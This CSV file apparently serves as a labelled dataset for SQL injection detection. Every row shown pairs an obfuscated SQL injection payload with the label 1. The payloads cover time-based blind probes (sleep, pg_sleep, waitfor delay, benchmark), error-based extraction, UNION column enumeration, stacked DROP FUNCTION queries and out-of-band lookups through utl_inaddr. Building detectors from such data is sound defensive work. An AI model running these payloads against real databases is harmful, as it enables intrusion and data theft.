Query,Label
"%s%%el%ec%%t benchmark  (  5000000,md5  (  0x4c4d6142   )    )    an%d    (    (     (  ""%""  =  """,1
"1"" w%%here 7879  =  7879",1
"1  )   w%%h%%er%%e 9687  =  9687 %a%%n%d elt  (  9607  =  9432,9432  )  --",1
"1%""   )    )    u%%n%i%o%%n all %%s%%e%%l%ect n%u%%l%l,n%u%%l%l--",1
1%'  )   o%%r 4240  =    (  %s%%e%%l%e%c%%t 4240 %%f%%r%om pg_sleep  (  5   )    )   --,1
"1""   )    )    waitfo%r delay '0:0:5'--",1
"1'  )   as nmzp w%%h%%er%e 3794  =  3794 %a%n%%d 6510  =    (  %s%el%%ec%%t count  (  *  )   %f%%r%%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
"1  )   wh%e%%r%e 1880  =  1880 %and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1
"1""   )    )    %%u%%n%ion all %%se%%le%ct %nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l,%nu%%l%l#",1
if  (  8182  =  3225  )   sel%e%c%t 8182 else %%dr%%o%%p function kpzk--,1
"1  )   %%a%nd   (  %s%%el%ec%%t 9067 %fr%%o%m  (  %s%%el%ec%%t count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%el%ec%%t   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floo%r  (  r%%a%nd  (  0  )  *2   )    )   x %fr%%o%m %%i%%nfo%rmation_schema.character_%%se%ts group %by x  )  a  )   %%a%nd   (  8529  =  8529",1
1  )   as xtgr %wh%er%e 1545  =  1545,1
"1%""   )    )     )   %%or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%i%ng  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%nu%%l%%l  )  --",1
"1""   )    )    as ikuz %wh%%er%%e 7385  =  7385",1
1 %%a%%n%d 6240  =    (  'qqpjq'||  (  %%se%%le%c%%t case 6240 when 6240 then 1 else 0 end f%%rom rdb$%da%%tabas%e  )  ||'qzvzq'  )  # twev,1
"-7923""   )    )    %%o%r make_s%e%%t  (  9354  =  9354,7185  )   a%n%%d    (    (   ""szct""  =  ""szct",1
"1'  )   as omtb %%w%%here 1183  =  1183 a%%n%%d 8635  =    (  %%s%e%%l%ect count  (  *  )   %f%%rom generate_series  (  1,5000000   )    )   --",1
1'||  (  s%%e%%l%ec%%t 'czos' f%%r%o%%m dual %%wh%%e%re 6814  =  6814,1
1'  )   r%l%%i%%k%%e   (  %s%%e%l%%e%%c%%t * %fr%%om   (  %s%%e%l%%e%%c%%t  (  sleep  (  5   )    )     )  sgvo  )   %%a%%nd   (  'lzbn'  =  'lzbn,1
"1""   )    )     )   %%and 5556  =    (  %%s%ele%%c%t count  (  *  )   f%%ro%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   %%and    (    (     (  ""sfbc""  =  ""sfbc",1
"1%""  )   %o%r 6793  =    (  s%el%e%ct 6793 f%%rom pg_sleep  (  5   )    )    a%nd   (  ""%""  =  """,1
"1' %i%n boolean mode  )   %a%n%d char  (  107  )  ||char  (  121  )  ||char  (  97  )  ||char  (  80  )    =  regexp_substr%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,n%%u%l%l  )  ,0  )  ,500000000  )  ,n%%u%l%l  )  --",1
"-1985%'   )    )     )   %u%n%%ion all %sel%%e%c%t 3051,3051,3051--",1
"-7661"" %u%%n%ion all sel%ec%%t 9551,9551,9551#",1
"1""   )    )     )   %an%d 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%sel%ec%%t   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )   %an%d    (    (     (  ""prtf"" %l%i%%ke ""prtf",1
"1   )    )    o%%r %%u%%pdat%%exml  (  1808,concat  (  0x2e,0x7171706a71,  (  s%%e%lect   (  elt  (  1808  =  1808,1   )    )     )  ,0x717a767a71  )  ,8666  )   %%a%%n%d    (    (   8965  =  8965",1
"1"" %%a%n%%d 8407  =    (  s%%e%le%ct count  (  *  )   %f%%ro%m generate_series  (  1,5000000   )    )   ",1
"1 %%o%r char  (  117  )  ||char  (  111  )  ||char  (  105  )  ||char  (  100  )    =  regexp_substr%%i%ng  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%ul%%l  )  ,0  )  ,500000000  )  ,%%n%ul%%l  )  ",1
"1%'  )   %o%r 2367  =    (  %s%el%e%c%%t count  (  *  )   %f%%r%om rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",1
"-1031%"" %uni%%on all %%s%el%e%%ct 6832,6832,6832,6832#",1
"-9740""   )    )    as pxkx %%w%her%e 5305  =  5305 %%o%r 1 group %b%y concat  (  0x7171706a71,  (  %s%e%%l%%e%ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,flo%%o%r  (  r%a%%nd  (  0  )  *2   )    )    hav%i%%ng m%i%%n  (  0  )  #",1
"1""   )    )    %%o%r 6793  =    (  %%se%l%ect 6793 fr%o%m pg_sleep  (  5   )    )    a%nd    (    (   ""ejpw""  =  ""ejpw",1
 (  %%s%e%l%%e%%ct   (  case when   (  6714  =  8872  )   then 1 else 6714*  (  %%s%e%l%%e%%ct 6714 from master..sysda%%ta%b%ases  )   end   )    ) ,1
"-1084'  )   %%u%ni%%o%n all %%s%e%%l%e%%c%%t 2634,2634,2634,2634,2634,2634,2634,2634#",1
"s%%el%ec%t * %%fro%%m generate_series  (  1431,1431,case when   (  1431  =  7822  )   then 1 else 0 end  )   %li%%mit 1--",1
-5217 %%wh%%e%%r%%e 3620  =  3620 %or 3440  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  %%sel%%e%c%%t   (  case when   (  3440  =  3440  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --,1
"1%' %a%nd elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-4452%"" %u%ni%o%%n all %se%%l%%e%c%t 7141,7141,7141,7141,7141,7141,7141,7141--",1
"1""   )    )    rl%i%%ke sleep  (  5  )  #",1
"1""   )    )    r%%l%i%ke   (  s%e%l%%e%%c%%t   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    )    %%a%n%d    (    (   ""ladc"" %%l%i%ke ""ladc",1
"1""  )   as hfgk wh%e%%r%%e 1100  =  1100 %%o%r char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substr%ing  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,%%n%%u%l%%l  )  --",1
"1%""   )    )    %%a%%nd elt  (  1210  =  1210,sleep  (  5   )    )    %%a%%nd    (    (   ""%""  =  """,1
1'||  (  s%%e%%le%%ct 'bezt' %w%%her%%e 7876  =  7876,1
"1'  )   %a%nd 8407  =    (  s%%e%l%%e%ct count  (  *  )   fro%%m generate_series  (  1,5000000   )    )   ",1
1  )   as nioj %wh%%e%%re 9703  =  9703,1
"1""   )    )     )   an%%d   (  7396  =  6351  )  *6351 an%%d    (    (     (  ""xerw"" %%li%k%%e ""xerw",1
"1'   )    )     )   %%a%n%%d 6414  =    (  %%s%el%ec%%t count  (  *  )   %%f%r%%o%%m rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   %%a%n%%d    (    (     (  'qtni'  =  'qtni",1
-7387'   )    )     )   %%o%r%%d%%e%%r %b%y 1--,1
"%%s%e%l%%ec%%t dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   %f%%r%om dual %an%d    (    (     (  'aatp'  =  'aatp",1
"1%"" %%an%%d elt  (  1210  =  1210,sleep  (  5   )    )    %%an%%d ""%""  =  """,1
"1'   )    )     )   %and 3707  =    (  %%s%e%%l%ec%%t count  (  *  )   f%%r%%o%%m sysibm.sys%%t%%a%%b%les as t1,sysibm.sys%%t%%a%%b%les as t2,sysibm.sys%%t%%a%%b%les as t3  )   %and    (    (     (  'viad' %%l%ik%e 'viad",1
"1  )   a%%n%%d 9660  =    (  sel%%e%%c%t count  (  *  )   fro%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
 (  %%s%e%lect * fro%%m   (  %%s%e%lect  (  sleep  (  5   )    )     )  lrov  ) ,1
"1""  )   as ltbl %wh%e%%r%e 6395  =  6395",1
1'+  (  %s%el%e%%c%t wpkh %%w%%h%e%%r%e 5842  =  5842,1
"1'||  (  s%%el%%e%c%%t 'ylek' wh%e%r%%e 3803  =  3803 %an%d 4241  =  convert  (  int,  (  s%%el%%e%c%%t char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  s%%el%%e%c%%t   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )      )    )   ||'",1
1  )   %w%h%%e%%r%e 5866  =  5866 %a%%n%%d 4595  =  4595#,1
"-2204'||  (  %%se%%l%ect 'bwae' f%r%o%m dual %w%h%e%re 4884  =  4884 %%u%%n%i%on all %%se%%l%ect 4884,4884,4884,4884,4884,4884,4884,4884,4884,4884#",1
"1%""  )   %%and 9764  =  6037 %%and   (  ""%""  =  """,1
1'  )   as qqyz %%w%h%%e%%r%e 2274  =  2274,1
"1'  )   a%nd char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substr%i%%ng  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,n%ul%%l  )   a%nd   (  'qutm'  =  'qutm",1
" %%s%%e%le%c%%t sleep  (  5  )   %a%%nd    (    (   ""%""  =  """,1
"-9808' %%i%%n boolean mode  )   %%u%%n%i%o%n all s%e%%l%e%%ct 2528,2528,2528,2528,2528,2528,2528--",1
1'   )    )    waitfor delay '0:0:5' an%%d    (    (   'jcfe'  =  'jcfe,1
"1"" %w%he%r%%e 7788  =  7788 %or 4411  =    (  s%%el%ec%t count  (  *  )   %%fr%%o%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )  --",1
1' %%wh%ere 4253  =  4253,1
"-8966""   )    )     )   %o%r 1628  =  2712",1
"1' un%%i%o%%n all s%%ele%%ct n%%u%%ll,n%%u%%ll,n%%u%%ll#",1
"1,  (  s%e%le%%c%t   (  case when   (  7734  =  7734  )   then   (  s%e%le%%c%t benchmark  (  5000000,md5  (  0x72747341   )    )     )   else 7734*  (  s%e%le%%c%t 7734 %f%r%om mysql.db  )   end   )    )   ",1
"1' %%i%%n boolean mode  )   %%a%%n%%d elt  (  3114  =  3114,sleep  (  5   )    )   #",1
"-5227"" %u%%n%ion all %se%le%%c%%t 2666--",1
"-9176'   )    )    as eunw %%w%h%%e%%r%e 5978  =  5978 or 1 group b%%y concat  (  0x7171706a71,  (  %%se%l%%e%ct   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  r%%a%%nd  (  0  )  *2   )    )    havi%%ng mi%%n  (  0  )  #",1
"-3074'   )    )    %%u%n%i%o%n all %s%e%%l%ec%%t 6131,6131,6131,6131,6131,6131,6131--",1
1' a%%n%d sleep  (  5  )   a%%n%d 'kapr'  =  'kapr,1
"1%'   )    )     )   %%a%nd make_%%s%e%t  (  8403  =  8403,8899  )   %%a%nd    (    (     (  '%'  =  '",1
"1  )   %%w%%h%e%%r%%e 6720  =  6720 %o%%r   (  s%%e%l%%ec%t 2*  (  if   (    (   s%%e%l%%ec%t * fro%m   (  s%%e%l%%ec%t concat  (  0x7171706a71,  (  s%%e%l%%ec%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  --",1
"-9698  )   as pvhn w%%h%er%%e 3223  =  3223 or elt  (  6563  =  9210,9210  )  --",1
"1"" %%and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )    %%and ""mynm"" %l%%i%%k%%e ""mynm",1
-1989%'   )    )    %%or 6179  =  8518#,1
1'||  (  %sel%%ec%t 'vwls' w%%her%e 5252  =  5252 r%l%%ike sleep  (  5  )  #,1
-8357'   )    )    as henk %%w%h%ere 8198  =  8198 %%or 2558  =  9103#,1
1'  )   as yxdb wh%e%r%%e 4597  =  4597,1
-1393'   )    )     )   u%n%i%on all s%el%e%ct 8280--,1
"1 %w%%h%%e%%r%e 9869  =  9869 %uni%%on all %%s%%elec%%t %nu%%l%l,%nu%%l%l#",1
s%%ele%ct   (  case when   (  8294  =  4332  )   then 1 else 8294*  (  s%%ele%ct 8294 %%fr%%o%m master..sys%%d%%a%%t%%ab%%a%%s%es  )   end  )  --,1
"1'  )   %%o%r 5286  =    (  se%l%e%c%t count  (  *  )   %%f%%r%%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1
"1'  )   %%a%n%%d 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
"-3775'  )   as rqet %w%%he%%re 7092  =  7092 %o%%r elt  (  1032  =  1032,3623  )  --",1
"1'  )   %a%%n%%d %%upd%%a%t%%exml  (  3393,concat  (  0x2e,0x7171706a71,  (  %s%ele%%ct   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   %a%%n%%d   (  'dtym'  =  'dtym",1
"1""  )   %wh%e%r%%e 5196  =  5196 %a%n%%d 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  s%el%%ec%%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %%f%%rom dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",1
"1 %%a%n%d row  (  6237,7469  )  >  (  %s%%e%%l%%e%c%t count  (  *  )  ,concat  (  0x7171706a71,  (  %s%%e%%l%%e%c%t   (  elt  (  6237  =  6237,1   )    )     )  ,0x717a767a71,floor  (  r%%a%n%d  (  0  )  *2   )    )   x %%fr%%o%%m   (  %s%%e%%l%%e%c%t 5192 %u%%n%%i%%o%n %s%%e%%l%%e%c%t 3785 %u%%n%%i%%o%n %s%%e%%l%%e%c%t 3931 %u%%n%%i%%o%n %s%%e%%l%%e%c%t 7158  )  a group %%b%%y x  )  -- ofqd",1
"  (  s%e%%l%%ect * %%from   (  s%e%%l%%ect  (  sleep  (  5   )    )     )  srmq  )   a%n%d    (    (     (  ""sxih""  =  ""sxih",1
-4325 %%o%%rde%%r %%b%y 1--,1
"-2321%""  )   %o%%r 2271  =  7683--",1
"1""  )   as ranl w%h%e%%r%%e 5553  =  5553",1
"1'  )   w%%h%e%r%e 8628  =  8628 %u%%ni%%on all %se%%l%%e%%c%t n%%u%ll,n%%u%ll,n%%u%ll--",1
"-3007  )   %wh%%e%%re 6648  =  6648 %%u%n%%i%%o%%n all %%s%%el%ect 6648,6648,6648,6648,6648,6648,6648,6648#",1
1'||  (  %%se%%l%ect 'awba' %f%%r%%o%m dual wher%e 3749  =  3749 %a%%nd 1445  =  3334--,1
"-6186' %i%%n boolean mode  )   %%u%n%i%o%n all s%e%%le%%ct 2990,2990,2990#",1
"1'   (  s%%e%l%%ec%t   (  case when   (  5451  =  5451  )   then regexp_substr%i%%ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,n%u%ll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   %%f%ro%%m %i%%nf%o%%rmation_schema.system_users  )  ",1
"1"" %%o%r   (  %s%ele%%c%t 2*  (  if   (    (   %s%ele%%c%t * fr%o%%m   (  %s%ele%%c%t concat  (  0x7171706a71,  (  %s%ele%%c%t   (  elt  (  8113  =  8113,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )  ",1
"1'  )   %%o%r 8384  =  %l%i%%k%e  (  'abcdefg',upper  (  hex  (  ran%%domblob  (  500000000/2   )    )      )    )    an%%d   (  'xdce'  =  'xdce",1
"1 %%or 7417  =    (  s%%elect count  (  *  )   %f%%r%o%%m sysibm.sys%tab%l%%es as t1,sysibm.sys%tab%l%%es as t2,sysibm.sys%tab%l%%es as t3  )  --",1
"1"" w%h%%e%r%e 4073  =  4073 rl%%i%ke   (  %s%%el%%e%%ct   (  case when   (  8716  =  4281  )   then 1 else 0x28 end   )    )   --",1
"1""   )    )     )   %%u%n%%i%%o%%n all %%sele%%c%%t %nu%%ll,%nu%%ll,%nu%%ll,%nu%%ll,%nu%%ll,%nu%%ll,%nu%%ll--",1
"waitfo%r delay '0:0:5' %%a%%nd    (    (   ""%""  =  """,1
"1""  )   %%w%h%%e%%r%%e 2312  =  2312 and   (  sele%ct 9067 %f%r%%om  (  sele%ct count  (  *  )  ,concat  (  0x7171706a71,  (  sele%ct   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,flo%%o%r  (  rand  (  0  )  *2   )    )   x %f%r%%om %i%%nf%%o%rmation_schema.character_%sets group %by x  )  a  )  --",1
"-9434""  )   as cqlw %%w%%h%e%r%e 1600  =  1600 %%o%%r 2733  =  1047--",1
"1   )    )     )   u%%nio%%n all %%s%%el%%e%c%%t n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l,n%%u%%l%%l#",1
"1""   )    )    %a%%n%d sleep  (  5  )  #",1
"-5925  )   %%w%%h%%e%re 5758  =  5758 un%%ion all %se%%l%e%%c%t 5758,5758,5758,5758,5758,5758,5758,5758,5758#",1
"1""  )   w%%h%e%re 2873  =  2873 %%or 7417  =    (  %s%e%%le%%c%t count  (  *  )   %f%r%o%%m sysibm.systa%b%l%es as t1,sysibm.systa%b%l%es as t2,sysibm.systa%b%l%es as t3  )  --",1
"1 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )  # usus",1
"1"" w%he%%r%%e 6004  =  6004",1
"1""   )    )    as svim %w%h%%er%e 4924  =  4924 a%n%%d 7932  =  5870",1
"1""   )    )     )   %a%nd 8594  =    (  %%se%%l%%ect 8594 %%fr%om pg_sleep  (  5   )    )   --",1
"1  )   un%i%on all %%s%%e%%l%%ec%%t n%ul%l,n%ul%l,n%ul%l,n%ul%l,n%ul%l--",1
"-2951"" o%r 4493  =  utl_i%naddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %s%e%%l%e%c%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %f%%r%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   ",1
"1%'   )    )    %u%nion all s%%e%%l%ec%%t %%nu%%ll,%%nu%%ll,%%nu%%ll,%%nu%%ll,%%nu%%ll,%%nu%%ll,%%nu%%ll,%%nu%%ll,%%nu%%ll#",1
-4644 %%o%%r 5903  =    (  'qqpjq'||  (  %s%e%%le%%c%t case 5903 when 5903 then 1 else 0 end %%from rdb$%d%%at%abase  )  ||'qzvzq'  )  # upwd,1
"1'   )    )     )   or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   %%and    (    (     (  'ochr' l%i%%k%e 'ochr",1
"1"" an%d 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%se%l%%e%%c%%t   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   %f%r%%o%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    an%d ""arqb"" %li%%ke ""arqb",1
"1  )   %%wher%e 7978  =  7978 %%o%%r 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1
"-9977"" w%h%%er%e 5132  =  5132 %%un%i%o%%n all %s%%e%l%e%%ct 5132--",1
-8047' %o%r 3038  =  3038,1
"1'  )   %%or 4411  =    (  s%e%%le%%c%%t count  (  *  )   %fro%%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   an%%d   (  'uwbh'  =  'uwbh",1
"1 %un%i%o%n all %%s%%e%lec%%t n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l,n%u%%l%%l--",1
1'   )    )     )   an%%d 7533  =  7533 an%%d    (    (     (  'txex'  =  'txex,1
1  )   as duqb %%wh%%e%re 6495  =  6495,1
"1'   )    )    as gqzy %w%%h%e%r%e 2312  =  2312 %%or 5286  =    (  %s%%e%l%ect count  (  *  )   f%%r%o%%m all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
"1%'   )    )     )   procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   %%a%%n%d    (    (     (  '%'  =  '",1
"1'  )   %%w%%h%ere 9304  =  9304 or 6979  =  %%l%ik%e  (  'abcdefg',upper  (  hex  (  r%a%%n%domblob  (  500000000/2   )    )      )    )   --",1
"1'||  (  %%s%e%l%%e%%c%t 'djoe' f%%r%%om dual %%w%h%%e%r%%e 8063  =  8063   (  %%s%e%l%%e%%c%t   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,%%n%%ul%l  )  ,0  )  ,500000000  )  ,%%n%%ul%l  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   f%%r%%om   (  v%a%%l%u%e%%s  (  0   )    )      )    )   ||'",1
-8553'+  (  %sel%%e%%ct adko w%%her%%e 1750  =  1750 %%un%%i%%o%n all %sel%%e%%ct 1750#,1
"1"" %%whe%%r%e 9792  =  9792 r%%l%%ik%%e   (  %s%%e%%l%%e%ct * %%f%%r%o%m   (  %s%%e%%l%%e%ct  (  sleep  (  5   )    )     )  vwyq  )  #",1
"%s%%e%%l%ect * fr%om generate_series  (  8147,8147,case when   (  8147  =  6336  )   then 1 else 0 end  )   l%%imit 1--",1
"-7889""   )    )    as oayf w%%h%e%%r%%e 1765  =  1765 %%o%%r 8571  =  8571--",1
"1'||  (  s%e%%l%e%c%%t 'mzhj' %%whe%re 9677  =  9677 u%ni%%o%%n all s%e%%l%e%c%%t %%nu%%l%%l,%%nu%%l%%l,%%nu%%l%%l--",1
1' %%wher%%e 7910  =  7910,1
end %%a%n%d    (    (     (  4675  =  4675,1
se%%lec%%t   (  case when   (  9696  =  2874  )   then 1 else 9696*  (  se%%lec%%t 9696 fr%%om master..sys%%d%a%t%a%b%%a%ses  )   end  )  --,1
"1'   )    )     )   an%%d 3202  =  %%li%k%e  (  'abcdefg',upper  (  hex  (  ran%%domblob  (  500000000/2   )    )      )    )    an%%d    (    (     (  'tzrd'  =  'tzrd",1
"1""  )   as ymsc w%h%e%r%e 3694  =  3694 waitfor delay '0:0:5'--",1
1'||  (  %%s%%e%%lec%%t 'npel' %fro%%m dual %%w%%h%e%%re 5258  =  5258,1
"1'+  (  sel%%e%c%%t vohg %w%%h%%er%%e 6383  =  6383 %%and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  sel%%e%c%%t   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   %%from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )      )    )   +'",1
"1'   )    )    %o%%r 4411  =    (  %%s%%ele%%c%t count  (  *  )   %%f%r%o%m sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   'niro'  =  'niro",1
1%'   )    )    r%%l%ike   (  %s%%e%le%c%%t   (  case when   (  6094  =  7893  )   then 1 else 0x28 end   )    )    %%a%n%%d    (    (   '%'  =  ',1
"1  )   %an%%d 8148  =  li%ke  (  'abcdefg',upper  (  hex  (  r%an%%domblob  (  500000000/2   )    )      )    )   --",1
1'  )   %%w%he%%r%e 5540  =  5540 waitfo%%r delay '0:0:5'--,1
1'  )   rl%%i%k%%e   (  %s%el%%e%%c%t   (  case when   (  7447  =  3981  )   then 1 else 0x28 end   )    ) ,1
1'+  (  %%s%e%l%e%%c%%t lptb %%w%her%%e 3861  =  3861 %%o%%r sleep  (  5   )    )   +',1
if  (  6767  =  5022  )   %se%%l%e%c%%t 6767 else %dro%p function buii--,1
"  (  %%s%e%%l%%e%%ct * f%%ro%m   (  %%s%e%%l%%e%%ct  (  sleep  (  5   )    )     )  srmq  )   %a%n%%d    (    (     (  ""eakt"" %%li%k%e ""eakt",1
"1""   )    )     )   %a%n%%d 2006  =  2006",1
"-9370'  )   w%%h%er%e 7070  =  7070 %%o%r make_s%e%%t  (  9354  =  9354,7185  )  --",1
"1 w%%h%e%r%%e 6169  =  6169   (  %%se%%l%e%c%%t   (  case when   (  5451  =  5451  )   then regexp_substr%i%ng  (  repeat  (  right  (  char  (  5451  )  ,0  )  ,500000000  )  ,%%nu%%ll  )   else char  (  108  )  ||char  (  76  )  ||char  (  112  )  ||char  (  116  )   end  )   %%f%%r%%o%m %i%nf%%ormation_schema.system_users  )  --",1
-4906'   )    )     )   o%r 4493  =  utl_%%inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  %%s%e%l%%e%c%%t   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   %%fro%%m dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    %an%d    (    (     (  'pkrq'  =  'pkrq,1
"1'+  (  s%%el%%ec%%t vxax w%%h%e%re 9036  =  9036 %%and elt  (  1210  =  1210,sleep  (  5   )    )     )  +'",1
1  )   as bpap w%h%e%%re 7758  =  7758 %o%r 4240  =    (  %%se%l%%e%ct 4240 f%ro%m pg_sleep  (  5   )    )   --,1
-1188   )    )    %%u%%ni%o%%n all s%e%%l%%e%%c%%t 4711--,1
"-2601'  )   un%%i%o%n all s%%e%l%e%%c%%t 2866,2866,2866,2866,2866,2866--",1
1   )    )     )   %a%%nd   (  3020  =  3020  )  *6703 %a%%nd    (    (     (  1233  =  1233,1
